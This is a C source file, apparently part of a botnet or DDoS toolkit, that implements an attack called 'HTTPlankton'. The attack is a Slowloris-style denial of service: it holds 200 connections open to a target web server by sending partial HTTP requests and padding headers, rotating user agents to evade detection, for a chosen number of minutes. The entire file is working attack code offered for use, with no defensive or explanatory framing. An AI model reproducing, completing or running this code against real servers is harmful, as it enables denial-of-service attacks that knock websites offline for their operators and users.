#define _GNU_SOURCE
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include <dict.h>

#define CONNECTIONS 200
#define SLEEP_TIME 1 // seconds delay

int sockets[CONNECTIONS];

static int create_socket()
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
#ifdef DEBUG
        perror("[HTTPlankton] Error during socket creation");
#endif
    }
    return sock;
}

static int connect_to_target(int sock, struct sockaddr_in *server)
{
    if (sock < 0)
        return -1;

    if (connect(sock, (struct sockaddr *)server, sizeof(*server)) < 0)
    {
#ifdef DEBUG
        perror("[HTTPlankton] Connection error");
#endif
        close(sock);
        return -1;
    }
    return sock;
}

static void send_http_request(int sock, char *target_ip)
{
    char request[1024];
    snprintf(request, sizeof(request),
             "GET / HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Accept-language: en-US,en,q=0.5\r\n\r\n",
             target_ip, get_random_user_agent());

    if (send(sock, request, strlen(request), 0) < 0)
    {
        close(sock);
    }
}

static void sleep_randomized()
{
    usleep((rand() % 500 + 100) * 1000); /* Random sleep between 100ms and 600ms */
}

static void send_evasive_request(int sock, char *target_ip)
{
    char request[1024];
    snprintf(request, sizeof(request),
             "POST /index.html HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Content-Length: 10\r\n\r\n"
             "abcdefghij",
             target_ip, get_random_user_agent());

    if (send(sock, request, strlen(request), 0) < 0)
    {
        close(sock);
    }
}

static void setup_connection(int index, char *target_ip, int target_port)
{
    struct sockaddr_in server = {
        .sin_family = AF_INET,
        .sin_port = htons(target_port),
        .sin_addr.s_addr = inet_addr(target_ip)};

    int sock = create_socket();
    sock = connect_to_target(sock, &server);

    if (sock < 0)
    {
        sockets[index] = -1;
        return;
    }

    send_http_request(sock, target_ip);
    sockets[index] = sock;
    sleep_randomized();
}

static void maintain_connections(char *target_ip)
{
    for (int i = 0; i < CONNECTIONS; i++)
    {
        if (sockets[i] < 0)
        {
            setup_connection(i, target_ip, 80);
            continue;
        }

        send_evasive_request(sockets[i], target_ip);

        if (send(sockets[i], "X-Padding: xxxx\r\n", 18, 0) < 0)
        {
            close(sockets[i]);
            sockets[i] = -1;
            setup_connection(i, target_ip, 80);
        }
    }
}

void start_httplankton_attack(char *target_ip, int target_port, int duration)
{
    int duration_seconds = duration * 60;
    time_t start = time(NULL);

#ifdef DEBUG
    printf("[HTTPlankton] Starting HTTPlankton attack on %s:%d for %d minutes\n",
           target_ip, target_port, duration);
#endif

    for (int i = 0; i < CONNECTIONS; i++)
    {
        sockets[i] = -1;
        setup_connection(i, target_ip, target_port);
    }

    while (time(NULL) - start < duration_seconds)
    {
        maintain_connections(target_ip);
#ifdef DEBUG
        printf("[HTTPlankton] Active connections... Continuing attack\n");
#endif
        sleep(SLEEP_TIME);
    }

#ifdef DEBUG
    printf("[HTTPlankton] Attack terminated after %d minutes\n", duration);
#endif

    for (int i = 0; i < CONNECTIONS; i++)
    {
        if (sockets[i] >= 0)
        {
            close(sockets[i]);
        }
    }
}
